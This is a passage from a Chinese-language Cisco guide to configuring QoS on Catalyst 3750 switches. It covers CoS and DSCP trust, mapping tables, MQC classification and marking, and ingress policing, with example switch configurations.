dscp keyword  ip-precedence  ip-precedence keyword  &lt;cr&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例 1：</strong>如果端口为接入端口或第 3 层端口，则需要配置<strong>mls qos trust dscp 命令。</strong>不能使用<strong>mls qos trustcos命令，因为来自接入端口或第3层端口的帧不包含dot1q或ISL标记。</strong>CoS位仅存在于 dot1q 或 ISL 帧中。</li></ul><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/1 description **** Layer 3 Port **** no switchport ip address 192.168.10.1 255.255.255.0 mls qos trust dscpendinterface GigabitEthernet1/0/2 description **** Access Port **** switchport access vlan 10 switchport mode access mls qos trust dscpend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>示例 2：</strong>如果端口为中继端口，则可以配置<strong>mls qos trust cos 或 mls qos trust dscp命令。</strong>如果端口配置为信任 DSCP，则将使用 dscp-cos 映射表计算 CoS值。同样，如果端口配置为信任 CoS，则将使用 cos-dscp 映射表计算 DSCP值。</p><p></p><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/3description **** Trunk Port ****switchport trunk encapsulation dot1qswitchport mode trunkswitchport trunk native vlan 5switchport trunk allowed vlan 5,10,20,30,40,50mls qos trust cosendinterface GigabitEthernet1/0/12 description **** Cisco IP Phone  **** switchport access vlan 10 switchport mode access switchport voice vlan 20 mls qos trust cos spanning-tree portfastend!--- The Cisco IP Phone uses IEEE 802.1Q frames for Voice !--- VLAN traffic.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p></li><li><p><strong>示例3：</strong>如果端口是dot1q中继端口，且端口配置了<strong>mls qos trustcos</strong>命令，则本地VLAN帧的CoS和DSCP值将为0。由于本地VLAN帧未标记，且帧在进入交换机后已标记，因此交换机会将默认CoS值设置为0，并将CoS-to-DSCP表将DSCP值设置为0。</p><p><strong>注意：</strong>来自本征VLAN的数据包的DSCP值将重置为0。</p><p>您还可以使用mls qos cos <strong>&lt;0-7&gt;</strong>命令配置交换机端口，将无标记帧的默认CoS值从0更改为0到7之间的任何其<strong>他值。</strong>此命令不会更改已标记的帧的CoS 值。</p><p>例如，使用接入 VLAN 10 和语音 VLAN 20 配置端口GigabitEthernet1/0/12。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/12 description **** Cisco IP Phone  **** switchport access vlan 10 switchport mode access switchport voice vlan 20 mls qos trust cos spanning-tree portfast!--- The Cisco IP Phone uses IEEE 802.1Q frames for Voice !--- VLAN traffic. Voice VLAN is only supported on access ports and not !--- on trunk ports, even though the configuration is allowed.end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>默认情况下，PC 将发送未标记的数据。无论电话上的接入端口的信任状态如何，来自连接到 Cisco IP 电话的设备的未标记数据流都将直接通过电话，不做任何更改。电话发送带有语音VLAN ID 20的dot1q标记帧。因此，如果使用 `mls qos trust cos` 命令配置端口，则它信任来自电话的帧（标记帧）的CoS值，并将来自PC的帧（未标记帧）的CoS值设置为0。之后，CoS-DSSCP映射表将帧内数据包的DSCP值设置为0，因为CoS-DSCP映射表的DSCP值为0（CoS值0）。如果来自PC的数据包具有任何特定DSCP值，则该值将重置为0。如果在端口上配置 `mls qos cos 3` 命令，则会设置Co从PC到3的所有帧的S值，不会更改来自电话的帧的CoS值。</code></pre><p></p><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/12 description **** Cisco IP Phone  **** switchport access vlan 10 switchport mode access switchport voice vlan 20 mls qos trust cos mls qos cos 3 spanning-tree portfastend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><pre><code>如果使用 `mls qos cos 3 override` 命令配置端口，它会将所有帧（已标记和未标记）的CoS值设置为`3`。它将覆盖之前配置的信任值。</code></pre><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/12 description **** Cisco IP Phone  **** switchport access vlan 10 switchport mode access switchport voice vlan 20 mls qos trust cos mls qos cos 3 override!--- Overrides the mls qos trust cos.!--- Applies CoS value 3 on all the incoming packets on both !--- the vlan 10 and 20. spanning-tree portfastend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例 4：</strong>例如，请看端口 gi 1/0/12 配置：</li></ul><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/12 description **** Cisco IP Phone  **** switchport access vlan 10 switchport mode access switchport voice vlan 20 mls qos trust cos spanning-tree portfastend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>如果PC使用VLAN 20标记其帧，它还将CoS值设置为5。交换机处理连接到Cisco IP电话接入端口的设备上的标记数据流量（IEEE 802.1Q或IEEE 802.1p帧类型中的流量）。由于接口配置为信任 CoS 值，因此通过 Cisco IP 电话上的接入端口接收的所有数据流都将直接通过电话，不做任何更改。交换机也信任并允许来自 PC 的数据流，并给予与 IP 电话数据流相同的优先级。这不是您希望看到的结果。使用 `switchport priority extend cos &lt;cos-value&gt;`  命令可以避免这种情况。</code></pre><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/12 description **** Cisco IP Phone  **** switchport access vlan 10 switchport mode access switchport voice vlan 20 mls qos trust cos switchport priority extend cos 0!--- Overrides the CoS value of PC traffic to 0. spanning-tree portfastend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>switchport priority extend cos &lt;cos-value&gt;</code>命令会对电话进行配置，以便 IP 电话将 PC 数据流的 CoS 值更改为 0。</p><ul><li><strong>示例 5：</strong> 例如，在同一接口中，有人将 PC直接连接到交换机，并使用具有较高 CoS 值的 dot1q 帧标记 PC 数据。使用<code>mls qos trust device cisco-phone</code>命令可以避免这种情况。</li></ul><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/12 description **** Cisco IP Phone  **** switchport access vlan 10 switchport mode access switchport voice vlan 20 mls qos trust cos switchport priority extend cos 0 mls qos trust device cisco-phone !--- Specify that the Cisco IP Phone is a trusted device. spanning-tree portfastend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例 6：</strong> 例如，在接口 GigabitEthernet1/0/12中，必须信任来自 PC 的 QoS 标签。此外，PC 连接到本地 VLAN10。在这种情况下，由于 PC 数据包未标记 CoS 值，因此<code>mls qos trust cos</code> 命令没有任何作用。它将仅标记 DSCP值。因此，交换机会添加dot1q帧并将默认CoS值配置为0。然后，CoS-DSCP表计算并重置DSCP值为0。</li></ul><p>要解决此问题，有二种选择。一种方法是使用 MQC 配置分类和标记。可以创建ACL，根据源、目标 IP 地址以及源/目标端口号来匹配 PC数据流。然后，可以在类映射中匹配此ACL。可以创建策略映射以信任此数据流。将在下一部分中讨论此解决方案。本部分讨论第二种方法。第二种方法是，信任DSCP 标签而不是 CoS 标签。然后，DSCP-CoS 标签将计算并设置与 DSCP值对应的 CoS 值。</p><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/12 description **** Cisco IP Phone  **** switchport access vlan 10 switchport mode access switchport voice vlan 20 mls qos trust dscp spanning-tree portfastend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于不建议信任所有 PC 数据流的 QoS 标签，因此首选第一种方法。</p><h4 id="标记---qos-映射表配置">标记 - QoS 映射表配置</h4><p>在启用 QoS 后，将使用默认值创建映射表并启用映射表。</p><pre class="line-numbers language-none"><code class="language-none">Distribution1#show mls qos maps cos-dscp   Cos-dscp map:        cos:   0  1  2  3  4  5  6  7     --------------------------------       dscp:   0  8 16 24 32 40 48 56Distribution1#show mls qos maps dscp-cos   Dscp-cos map:     d1 :  d2 0  1  2  3  4  5  6  7  8  9     ---------------------------------------      0 :    00 00 00 00 00 00 00 00 01 01      1 :    01 01 01 01 01 01 02 02 02 02      2 :    02 02 02 02 03 03 03 03 03 03      3 :    03 03 04 04 04 04 04 04 04 04      4 :    05 05 05 05 05 05 05 05 06 06      5 :    06 06 06 06 06 06 07 07 07 07      6 :    07 07 07 07<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>示例 1：</strong> 如果将端口配置为信任CoS，则将信任所有传入的 CoS 值，并根据 CoS-DSCP 表重新标记 DSCP值。根据默认的 CoS-DSCP 配置，这些值将按以下方式映射：</p><table><thead><tr class="header"><th>CoS</th><th>DSCP（十进制）</th><th>DSCP</th></tr></thead><tbody><tr class="odd"><td>0</td><td>0</td><td>默认</td></tr><tr class="even"><td>1</td><td>8</td><td>CS1</td></tr><tr class="odd"><td>2</td><td>16</td><td>CS2</td></tr><tr class="even"><td>3</td><td>24</td><td>CS3</td></tr><tr class="odd"><td>4</td><td>32</td><td>CS4</td></tr><tr class="even"><td>5</td><td>40</td><td>CS5</td></tr><tr class="odd"><td>6</td><td>48</td><td>CS6</td></tr><tr class="even"><td>7</td><td>56</td><td>CS7</td></tr></tbody></table><p>您需要在此处注意的一个重要值是DSCP值与CoS值5对应。它是CS5。示例2介绍此值。</p></li><li><p><strong>示例 2：</strong> 例如，接口 GigabitEthernet1/0/12配置为信任 CoS。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/12 description **** Cisco IP Phone  **** switchport access vlan 10 switchport mode access switchport voice vlan 20 mls qos trust cos spanning-tree portfastend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 Cisco IP 电话将数据流发送到交换机时，它会使用 CoS 5 和 DSCP EF标记语音有效负载。当数据流进入端口 Gi 1/0/12 时，交换机将信任 CoS值。然后，交换机从 CoS-DSCP 表获得与 CoS 值 5 对应的 DSCP 值 CS5(40)。所有带CoS5的语音负载都标有DSCP值CS5。这不是期望值。语音有效负载所需的 DSCP 值为DSCP EF。默认情况下，其他 CoS 值均可根据 RFC 正确映射到 DSCP 值。</p><p>以下配置可帮助您配置 CoS-DSCP 映射表，以更改与 CoS 5 对应的 DSCP 值EF。</p><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)# mls qos map cos-dscp 0  8 16 24 32 46 48 56!--- DSCP 46 is EF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>进行此配置后，这些值将按以下方式映射：</p><pre><code>| CoS | DSCP（十进制） | DSCP || --- | --- | --- || 0   | 0   | 默认  || 1   | 8   | CS1 || 2   | 16  | CS2 || 3   | 24  | CS3 || 4   | 32  | CS4 || **5** | **46** | **EF** || 6   | 48  | CS6 || 7   | 56  | CS7 |</code></pre><ul><li><p><strong>示例 3：</strong> 如果将端口配置为信任DSCP，则将信任所有传入的 DSCP 值，并根据 DSCP-CoS 表重新标记 CoS值。根据默认的 DSCP-CoS 配置，这些值将按以下方式映射：</p><table><thead><tr class="header"><th>DSCP</th><th>DSCP（十进制）</th><th>CoS</th></tr></thead><tbody><tr class="odd"><td>默认</td><td>0-7</td><td>0</td></tr><tr class="even"><td>CS1 AF11 AF12 AF13</td><td>8-15</td><td>1</td></tr><tr class="odd"><td>CS2 AF21 AF22 AF23</td><td>16-23</td><td>2</td></tr><tr class="even"><td>CS3 AF31 AF32 AF33</td><td>24-31</td><td>3</td></tr><tr class="odd"><td>CS4 AF41 AF42 AF43</td><td>32-39</td><td>4</td></tr><tr class="even"><td>CS5 EF</td><td>40-47</td><td>5</td></tr><tr class="odd"><td>CS6</td><td>48-55</td><td>6</td></tr><tr class="even"><td>CS7</td><td>56-63</td><td>7</td></tr></tbody></table></li></ul><p>您不需要更改这些默认值。</p><p>下表汇总了 DSCP 值和 CoS 值，仅供参考：</p><table><thead><tr class="header"><th>DSCP（十进制）</th><th>DSCP</th><th>CoS</th></tr></thead><tbody><tr class="odd"><td>0</td><td>默认</td><td>0</td></tr><tr class="even"><td>8</td><td>CS1</td><td>1</td></tr><tr class="odd"><td>10</td><td>AF11</td><td>1</td></tr><tr class="even"><td>12</td><td>AF12</td><td>1</td></tr><tr class="odd"><td>14</td><td>AF13</td><td>1</td></tr><tr class="even"><td>16</td><td>CS2</td><td>2</td></tr><tr class="odd"><td>18</td><td>AF21</td><td>2</td></tr><tr class="even"><td>20</td><td>AF22</td><td>2</td></tr><tr class="odd"><td>22</td><td>AF23</td><td>2</td></tr><tr class="even"><td>24</td><td>CS3</td><td>3</td></tr><tr class="odd"><td>26</td><td>AF31</td><td>3</td></tr><tr class="even"><td>28</td><td>AF32</td><td>3</td></tr><tr class="odd"><td>30</td><td>AF33</td><td>3</td></tr><tr class="even"><td>32</td><td>CS4</td><td>4</td></tr><tr class="odd"><td>34</td><td>AF41</td><td>4</td></tr><tr class="even"><td>36</td><td>AF42</td><td>4</td></tr><tr class="odd"><td>38</td><td>AF43</td><td>4</td></tr><tr class="even"><td>40</td><td>CS5</td><td>5</td></tr><tr class="odd"><td>42</td><td></td><td>5</td></tr><tr class="even"><td>44</td><td></td><td>5</td></tr><tr class="odd"><td>46</td><td>EF</td><td>5</td></tr><tr class="even"><td>48</td><td>CS6</td><td>6</td></tr><tr class="odd"><td>56</td><td>CS7</td><td>7</td></tr></tbody></table><p><strong>注意：</strong> 在网络中，所有CiscoCatalyst交换机应具有相同的映射表。在不同交换机中使用不同的映射表值将导致意外的QoS 行为。</p><h4 id="分类和标记---基于-mqc">分类和标记 - 基于 MQC</h4><p>如“分类和标记”部分中所述，您可以使用 MQC对数据包进行分类和标记。可以使用 MQC而不是特定于端口的配置。还可以使用策略映射标记传入的数据包。</p><p>本示例的要求如下：</p><ul><li><p>信任 IP 电话数据流的 CoS 值。</p></li><li><p>标记来自连接 IP 电话的 PC 的软电话应用程序数据包的 DSCP值。</p></li><li><p>不信任来自 PC 的所有其他数据流。</p></li></ul><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config4.gif" title="cat3750-qos-config4.gif"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config4.gif" alt="cat3750-qos-config4.gif"></a></p><p>此图显示，策略映射应用于接口的输入端。在 Catalyst 3750交换机中，不能将策略映射应用于任何接口的输出端。下一个配置将呈现该图。本部分不着重介绍QoS 功能的排队功能。本部分仅重点介绍接口上应用的 MQC。</p><p>假设数据VLAN为10，子网地址为172.16.10.0/24。语音VLAN为100，子网地址为192.168.100.0/24。</p><pre class="line-numbers language-none"><code class="language-none">!--- Section ADistribution1(config)#ip access-list extended voice-trafficDistribution1(config-std-nacl)#permit ip 192.168.100.0 0.0.0.255 anyDistribution1(config-std-nacl)#ip access-list extended database-applicationDistribution1(config-ext-nacl)#permit tcp any any eq 1521Distribution1(config-ext-nacl)#permit tcp any any eq 1810Distribution1(config-ext-nacl)#permit tcp any any eq 2481Distribution1(config-ext-nacl)#permit tcp any any eq 7778Distribution1(config-ext-nacl)#exitDistribution1(config)#class-map  Class-ADistribution1(config-cmap)#match access-group name voice-trafficDistribution1(config-cmap)#exitDistribution1(config)#class-map  Class-BDistribution1(config-cmap)#match access-group name database-applicationDistribution1(config-cmap)#exit!--- Section BDistribution1(config)#policy-map sample-policy1Distribution1(config-pmap)#class Class-ADistribution1(config-pmap-c)#trust cosDistribution1(config-pmap-c)#exitDistribution1(config-pmap)#class Class-BDistribution1(config-pmap-c)#set dscp af21Distribution1(config-pmap-c)#exitDistribution1(config-pmap)#exit!--- Section CDistribution1(config)#interface gigabitEthernet 1/0/13Distribution1(config-if)#switchport access vlan 10Distribution1(config-if)#switchport mode accessDistribution1(config-if)#switchport voice vlan 100Distribution1(config-if)#spanning-tree portfastDistribution1(config-if)#service-policy input sample-policy1Distribution1(config-if)#exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>A 部分：</strong></p><ul><li><p>将 IP 电话数据流分类为 Class-A。IP 电话属于语音 VLAN，在192.168.100.0 子网中具有 IP 地址。</p></li><li><p>将数据库应用程序数据流分类为 Class-B。通过端口号1521、1810、2481、7778 发往任何目标的 PC数据流（根据配置，实际上为任何数据流）被分类为 Class-B 类映射。</p></li></ul><p><strong>B 部分：</strong></p><ul><li><p>与 Class-A 匹配的数据流配置为信任 CoS 标签。这意味着信任来自 IP电话的所有数据流的 CoS 值。如图所示，对于 Class-A 数据流，将从 CoS-DSCP映射表获得 DSCP 值。</p></li><li><p>匹配B类流量的流量配置为将DSCP值设置为AF21。如图所示，DCoS值从B类流量的DSCP-CoS映射表派生。</p></li><li><p>策略映射的各个类别下的配置称为 PHB 操作。在 Cisco路由器中，支持的 PHB 操作包括标记、排队、策略、整形和拥塞避免。在 CiscoCatalyst 3750 交换机中，仅支持标记和策略 PHB 操作。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#policy-map testDistribution1(config-pmap)#class testDistribution1(config-pmap-c)#?QoS policy-map class configuration commands:  exit            Exit from QoS class action configuration mode  no              Negate or set default values of a command  police          Police  service-policy  Configure QoS Service Policy  set             Set QoS values  trust           Set trust value for the class  &lt;cr&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>set</code> 和 <code>trust</code> 命令是标记 PHB 操作。可以配置<strong>set 或 trust PHB 操作。</strong>在策略映射的一个类别中，不能同时配置这两项操作。但是，可以在同一策略映射的一个类别中配置<strong>set，并在另一个类别中配置 trust。</strong></p><p><code>police</code> 命令是策略 PHB操作。将在下一部分中详细讨论此命令。</p><p>Cisco Catalyst 3750 交换机不支持整形。Cisco Catalyst 3750交换机支持排队和拥塞避免，但不能使用 MQC进行配置。在本文档后面的部分中，将详细讨论排队和拥塞避免配置。</p><p><strong>C 部分：</strong></p><ul><li>仅可将策略映射应用于接口的输入端。如果将其应用于接口的输出端，则会收到以下错误消息：</li></ul><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#int gi 1/0/3Distribution1(config-if)#service-policy output testWarning: Assigning a policy map to the output side of an         interface not supportedService Policy attachment failedWarning: Assigning a policy map to the output side of an         interface not supported<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>如果在端口 gi 1/0/3 上配置了任何其他 QoS分类方法（例如，基于端口或基于VLAN），则会在应用策略映射时删除这些配置。例如，端口 Gi 1/0/13配置为信任 CoS，如下所示：</li></ul><pre class="line-numbers language-none"><code class="language-none">interface GigabitEthernet1/0/13 description **** Access Port **** switchport access vlan 10 switchport mode access switchport voice vlan 100 mls qos cos 3 mls qos trust cos spanning-tree portfast<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将策略映射应用于该接口时，它会删除 <strong>trust命令。</strong></li></ul><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#int gi 1/0/13Distribution1(config-if)#service-policy input sample-policy1Distribution1(config-if)#do show run int gi 1/0/13Building configuration...Current configuration : 228 bytes!interface GigabitEthernet1/0/13 description **** Access Port **** switchport access vlan 10 switchport mode access switchport voice vlan 100 service-policy input sample-policy1   !--- It replaces the mls qos trust or mls qos !--- vlan-based command. mls qos cos 3     !--- This command is not removed. spanning-tree portfastend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>您可以看到，服务策略输入仅替换 <strong>mls qos trust 或 mls qosvlan-based 的命令。</strong> 它不会更改其他命令，例如 <strong>mls qoscos 或 mls qos dscp-mutation 命令。</strong> 总而言之，它将替换 QoS分类命令，而不会替换 QoS 标记命令。</p><ul><li>在策略映射中，只能看到两种类映射。Class-A 与 IP 电话数据流相匹配，而Class-B 与来自 PC 的数据库应用程序数据流相匹配。所有其他 PC数据流（访问列表中定义的数据库应用程序除外）将归类在策略映射的class-default类别下。这是一种全包容数据流，它将捕获与应用于策略映射的已定义类映射不匹配的所有数据流。因此，属于class-default的此流量不受端口信任，并且这些数据包使用默认CoS和DSCP标签设置为0。您可以将任何默认CoS或DSCP值配置为此类默认流量。</li></ul><p>可以使用 MQC 设置默认的 DSCP 值。从 DSCP-CoS 映射表获得 CoS 值。</p><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#policy-map sample-policy1Distribution1(config-pmap)#class class-defaultDistribution1(config-pmap-c)#set dscp af13Distribution1(config-pmap-c)#exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以设置默认的 CoS 值，如下所示。从 CoS-DSCP 映射表获得 DSCP 值。</p><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#int gi 1/0/13Distribution1(config-if)#mls qos cos 3Distribution1(config-if)#do show run int gi 1/0/13Building configuration...Current configuration : 228 bytes!interface GigabitEthernet1/0/13 description **** Access Port **** switchport access vlan 10 switchport mode access switchport voice vlan 100 service-policy input sample-policy1   mls qos cos 3     spanning-tree portfast<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="为流量设置最高优先级">为流量设置最高优先级</h4><p>在本示例中，配置用于设置来自TCP端口1494的流量的最高优先级。</p><ol type="1"><li>需要为VOIP流量分配DSCP值EF:</li></ol><pre class="line-numbers language-none"><code class="language-none">!--- Classifying all traffic coming with dscp value of EF !--- under this class-map.Switch(config)# class-map match-all AutoQoS-VoIP-RTP-TrustSwitch(config-cmap)# match ip dscp ef Switch(config)# policy-map AutoQoS-Police-CiscoPhoneSwitch(config-pmap)# class AutoQoS-VoIP-RTP-Trust!--- Again setting the dscp value back to EF.Switch(config-pmap-c)# set dscp efSwitch(config-pmap-c)# police 320000 8000 exceed-action policed-dscp-transmit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2" type="1"><li>需要为来自TCP 1494的流量分配DSCP值CS4:</li></ol><pre class="line-numbers language-none"><code class="language-none">Switch(config)# access-list 100 permit tcp            eq 1494Switch(config)# class-map tcp Switch(config-cmap)# match access-group 100Switch(config)# policy-map AutoQoS-Police-CiscoPhoneSwitch(config-pmap)# class tcpSwitch(config-pmap-c)# set dscp cs4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3" type="1"><li>所有其他流量需要分配CS3:</li></ol><pre class="line-numbers language-none"><code class="language-none">Switch(config)# access-list 200 permit ip any anySwitch(config)# class-map defaultSwitch(config-cmap)# match access-group 200Switch(config)# policy-map AutoQoS-Police-CiscoPhoneSwitch(config-pmap)# class defaultSwitch(config-pmap-c)# set dscp cs3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4" type="1"><li>在相关接口下应用它：</li></ol><pre class="line-numbers language-none"><code class="language-none">Switch(config)# interfaceSwitch(config-if)# service-policy  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="管制">管制</h3><p>在 Cisco Catalyst 3750 交换机上，只能在入站端口上配置策略。只能通过MQC配置策略。这意味着没有任何特定于接口的命令用来管制数据流。可以在策略映射中配置策略，并且可以仅使用<strong>service-policy input <policy-name> 命令应用策略映射。</policy-name></strong>不能将任何策略映射应用于接口的输出端。</p><pre class="line-numbers language-none"><code class="language-none">Distribution1(config-if)#service-policy output testpolice command is not supported for this interfaceConfiguration failed!Warning: Assigning a policy map to the output side of an          interface not supported.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本部分将讨论以下主题：</p><ul><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#concept231">分类、标记和策略（超标操作- drop）</a></p></li><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#concept232">分类、标记和策略（超标操作- policed-dscp-transmit）</a></p></li></ul><h4 id="分类标记和策略超标操作---drop">分类、标记和策略（超标操作 -drop）</h4><p>本部分介绍丢弃过量的数据流的策略配置。策略测量传入的数据流，并将传入速率保持在配置的速率（比特/秒）。CiscoCatalyst 3750交换机仅支持单速率、单桶策略。这意味着交换机仅在一个速率下进行测量，且能够以二种颜色（表示达标操作和超标操作）标记数据流的概况。下图显示了具有三个类映射的策略映射sample-policy2。</p><p>本示例的要求如下：</p><ul><li><p>将 ftp、pop3、imap 数据流管制为 10Mbps。</p></li><li><p>信任来自连接到 IP 电话的 PC 的 IP Communicator 应用程序数据包的DSCP 值。同时，需要将此数据流管制为 1Mbps。</p></li><li><p>标记 filnet 应用程序并进行管制。</p></li></ul><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config5.gif" title="US 网站"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config5.gif" alt="cat3750-qos-config5.gif"></a></p><p>以下配置体现了图中提及的策略映射：</p><pre class="line-numbers language-none"><code class="language-none">!--- Create Access-list and Class map Class-ADistribution1(config)#ip access-list extended BULK-DATADistribution1(config-ext-nacl)#permit tcp any any eq ftpDistribution1(config-ext-nacl)#permit tcp any any eq ftp-dataDistribution1(config-ext-nacl)#permit tcp any any eq pop3Distribution1(config-ext-nacl)#permit tcp any any eq 143Distribution1(config-ext-nacl)#exitDistribution1(config)#class-map Class-ADistribution1(config-cmap)#match access-group name BULK-DATADistribution1(config-cmap)#exit!--- Create Access-list and Class map Class-BDistribution1(config)#ip access-list extended IP-CommunicatorDistribution1(config-ext-nacl)#remark *** Voice Payload ***Distribution1(config-ext-nacl)#permit udp any any range 16384 32767Distribution1(config-ext-nacl)#remark *** Voice Signalling ***Distribution1(config-ext-nacl)#permit tcp any any range 2000 2002Distribution1(config-ext-nacl)#exitDistribution1(config)#class-map Class-BDistribution1(config-cmap)#match access-group name IP-CommunicatorDistribution1(config-cmap)#exit!--- Create Access-list and Class map Class-CDistribution1(config)#ip access-list extended applicationDistribution1(config-ext-nacl)#remark *** Application for example ***Distribution1(config-ext-nacl)#permit tcp any any eq 32768Distribution1(config-ext-nacl)#permit udp any any eq 32768Distribution1(config-ext-nacl)#permit tcp any any eq 32769Distribution1(config-ext-nacl)#permit udp any any eq 32769Distribution1(config-ext-nacl)#exitDistribution1(config)#class-map Class-CDistribution1(config-cmap)#match access-group name applicationDistribution1(config-cmap)#exit!--- Create Policy mapDistribution1(config-cmap)#policy-map sample-policy2Distribution1(config-pmap)#class Class-ADistribution1(config-pmap-c)#police 10000000 8000 exceed-action dropDistribution1(config-pmap-c)#class Class-BDistribution1(config-pmap-c)#trust dscpDistribution1(config-pmap-c)#police 256000 8000 exceed-action dropDistribution1(config-pmap-c)#class Class-CDistribution1(config-pmap-c)#set dscp CS2Distribution1(config-pmap-c)#police 25000000 8000 exceed-action dropDistribution1(config-pmap-c)#exitDistribution1(config-pmap)#exit!--- Apply Policy map to the interfaceDistribution1(config)#interface GigabitEthernet1/0/20Distribution1(config-if)#service-policy input sample-policy2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面将解释策略映射中的配置：</p><ul><li><p><strong>Class-A：</strong> 与 Class A 匹配的数据流的速率管制为 10Mbps。不信任 Class A 数据流上的 QoS标签。CoS和DSCP值标记为0。监察器丢弃过多的数据包。</p></li><li><p><strong>Class-B：</strong> 对于与 Class B匹配的数据流，将执行两项 PHB操作。一项操作是信任，另一项操作是策略。信任 Class-B 数据流的 DSCP值。将从 DSCP-CoS 表获得 CoS 值。然后，将 Class B 数据流的速率管制为 